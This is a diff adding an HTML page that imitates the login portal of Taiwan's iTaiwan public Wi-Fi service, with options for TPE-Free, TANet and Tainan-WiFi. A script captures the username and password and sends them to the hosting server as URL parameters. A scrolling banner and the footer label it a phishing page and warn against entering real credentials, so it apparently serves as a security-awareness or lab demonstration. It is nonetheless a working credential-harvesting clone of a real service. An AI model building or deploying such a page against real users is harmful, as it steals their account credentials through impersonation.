@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta http-equiv='Content-Type' content='text/html; charset=utf-8'>
+  <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1'>
+  <title>iTaiwan 釣魚網頁</title>
+  <style type='text/css'>
+    body,div,dl,dt,dd,ul,ol,li,h1,h2,h3,h4,h5,h6,pre,form,fieldset,input,textarea,p,blockquote,th,td {
+      padding: 0;
+      margin: 0;
+    }
+    div {
+      display: block;
+    }
+    .horse {
+      line-height: 120%;
+    }
+    .nav {
+      background: linear-gradient(rgb(139, 103, 193), rgb(127, 88, 186) 48%, rgb(83, 20, 160) 52%);
+      height: 38px;
+      width: 100%;
+      font-family: Arial;
+    }
+    .page_header {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      height: 86px;
+      font-size: 13px;
+      border-top: 2px #6d29a7 solid;
+    }
+    .page_header .page_banner {
+      width: 320px;
+      height: 47px;
+      margin: 0 auto;
+      position: relative;
+    }
+    .page_header .header_nav {
+      position: absolute;
+      top: 0px;
+      right: 0px;
+      z-index: 999;
+    }
+    .content {
+      color: #666;
+      clear: both;
+    }
+    .content .context {
+      width: 300px;
+      margin: 0 auto;
+      padding: 10px;
+      font-family: Arial;
+    }
+    .content .section {
+      padding: 0 0 10px;
+    }
+    .phonenum {
+      height: 50px;
+      background: rgb(238, 238, 238);
+      text-align: center;
+      vertical-align: middle;
+      margin: 0 auto;
+    }
+    a {
+      text-decoration: none;
+      color: #666666;
+    }
+    a:-webkit-any-link {
+      color: -webkit-link;
+      cursor: pointer; //text-decoration: underline;
+    }
+    .phonenum a {
+      color: #474747;
+      font: bold 15px Microsoft JhengHei;
+      line-height: 50px;
+    }
+    .horse a {
+      color: #F90;
+    }
+    .page_header .header_nav a {
+      color: #999;
+      font: bold 13px/15px arial;
+      border: 0px #dadada solid;
+      padding: 2px;
+    }
+    .page_banner a {
+      display: inline-block;
+      width: 280px;
+      height: 50px;
+      background: url('data:image/png;base64,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') no-repeat;
+    }
+    .header a.logo,
+    .page_header a.logo {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      display: inline-block;
+    }
+    li {
+      text-align: -webkit-match-parent;
+    }
+    ul {
+      display: block;
+    }
+    ol,ul {
+      list-style: none;
+    }
+    .nav ul {
+      width: 320px;
+      margin: 0 auto;
+      width: 300px;
+    }
+    .nav ul li {
+      display: inline-block;
+      float: left;
+      line-height: 38px;
+      text-align: center;
+      height: 38px;
+      width: 70px;
+      color: #fff;
+    }
+    .nav ul li a {
+      color: #fff;
+      font-size: 15px;
+      font-weight: bold;
+      font-family: arial;
+    }
+    .footer .data .copyright a {
+      color: #000;
+      text-decoration: underline;
+    }
+    .content h2.title {
+      font: bold 25px/120% Arial;
+      margin: 0 0 10px;
+      color: #000;
+      border-bottom: 1px #333 solid;
+      padding: 0 0 7px;
+      position: relative;
+    }
+    .content h4 {
+      font: 20px/120% Arial;
+      margin: 0 0 10px;
+      color: #666;
+    }
+    .content input.keyin {
+      width: 100%;
+      height: 25px;
+      font: 14px/120% Arial;
+    }
+    .content input.btn {
+      color: #666;
+      font: 22px/120% Arial;
+      display: block;
+      border: 1px #cacaca solid;
+      background: linear-gradient(to right, rgb(218, 218, 218), rgb(255, 255, 255) 18%, rgb(255, 255, 255) 82%, rgb(218, 218, 218));
+      width: 270px;
+      padding: 10px;
+      margin: 0 auto;
+      text-align: center;
+    }
+    .footer .data .copyright {
+      color: #000;
+      text-align: center;
+      font-size: 15px;
+      line-height: 150%;
+      padding: 5px 0 0 0;
+    }
+    marquee {
+      display: inline-block;
+      width: -webkit-fill-available;
+    }
+    body {
+      font-size: 22px;
+      font-family: Arial, Helvetica, sans-serif, Arial;
+      line-height: 120%;
+      color: #333;
+      background: #fff;
+    }
+    html {
+      color: -internal-root-color;
+    }
+  </style>
+  <script type='text/javascript'>
+    function check() {
+      var info = 'usn='+document.getElementById('username').value+'&pwd='+document.getElementById('password').value;
+      location.href = '/login?'+info;
+    }
+    function enter(){
+      if(event.keyCode==13){
+        check();
+      }
+    }
+  </script>
+</head>
+<body>
+  <div class='wrapper'>
+    <!--Header Start-->
+    <div class='horse'>
+      <!--<marquee scrollAmount=2></marquee>-->
+      <marquee scrollamount='2'><a href='/' target='_blank' rel='noopener'>此為釣魚網頁，請勿輸入真實帳號密碼</a></marquee>
+    </div>
+    <div class='page_header clearfix'>
+      <div class='page_banner'>
+        <a href='/' class='logo'></a>
+      </div>
+      <div class='header_nav'>
+        <ul>
+          <li class='nav02'><a>English</a></li>
+        </ul>
+      </div>
+      <div class='nav'>
+        <ul>
+          <li><a href='/' class='nav01'>帳號申請</a></li>
+          <li><a href='/' class='nav02' target='_blank'>熱點查詢</a></li>
+          <li><a href='/' class='nav03'>使用說明</a></li>
+          <li><a href='/' class='nav04'>帳號管理</a></li>
+        </ul>
+      </div>
+    </div>
+    <!--Header End-->
+    <form id='myform' name='login_form' method='post' onsubmit='return dosubmit(login_form, ' 1d762317e768376b4b0c6080b1a6db53 ', 'username ', 'password ');' action='https://wlanac.hinet.net/loginpages/userlogin.shtml' autocomplete='off'>
+      <div class='container clearfix'>
+        <div class='content'>
+          <div class='context'>
+            <h2 class='title'>帳號認證</h2>
+            <div class='section'>
+              <h4>請輸入手機號碼或<b><a href='/' target='_blank'><font color='#0092D8'>帳號(境外旅客帳號申請說明)</font></a></b></h4>
+              <input id='username' name='clt_user' type='text' class='keyin'>
+            </div>
+            <div class='section'>
+              <h4>請輸入無線上網密碼<a href='/'><b><font color='#0092D8'> (忘記密碼?)</font></b></a></h4>
+              <font color='#0092D8'>
+                <input id='password' name='clt_pass' type='password' class='keyin' onkeypress='enter()'>
+              </font>
+            </div>
+            <font color='#0092D8'>
+              <div class='section'>
+                <h4>選擇上網身分</h4>
+                <input type='radio' name='type' value='0' checked=''> iTaiwan
+                <input type='radio' name='type' value='1'> TPE-Free<br>
+                <!--input type='radio' name='type' value='2' > NewTaipei-->
+                <input type='radio' name='type' value='3'> TANet
+                <input type='radio' name='type' value='4'> Tainan-WiFi
+              </div>
+              <div class='section'>
+                <br>
+                <input name='remember' type='checkbox'> 記住我
+              </div>
+              <div class='section center'>
+                <input type='button' class='btn' onclick='check()' value='登入'></input>
+              </div>
+            </font>
+          </div>
+          <font color='#0092D8'>
+          </font>
+        </div>
+        <font color='#0092D8'>
+        </font>
+      </div>
+      <font color='#0092D8'>
+        <!--<input id='username' name='username' type='hidden' value='username'>
+        <input id='password' name='password' type='hidden' value='password'>
+        <input name='session' type='hidden' value=''>-->
+        <!--Footer Start-->
+        <div class='footer clearfix'>
+          <div class='data'>
+            <!--<img src='data:image/png;base64,' width='320' height='57' alt=''>-->
+            <div class='phonenum'>
+              <a>客服電話:0800-000-123</a>
+            </div>
+            <div class='copyright'>
+              釣魚網頁 版權所有 ©copyright 2020<br>
+              <a href='/' target='_blank'> 無線上網服務規章</a>
+              <a href='/' target='_blank'> 隱私權政策</a>
+              <a href='/'> 聯絡我們</a>
+            </div>
+          </div>
+        </div>
+        <!--Footer End-->
+      </font>
+    </form>
+  </div>
+  <font color='#0092D8'>
+  </font>
+</body>
+</html>
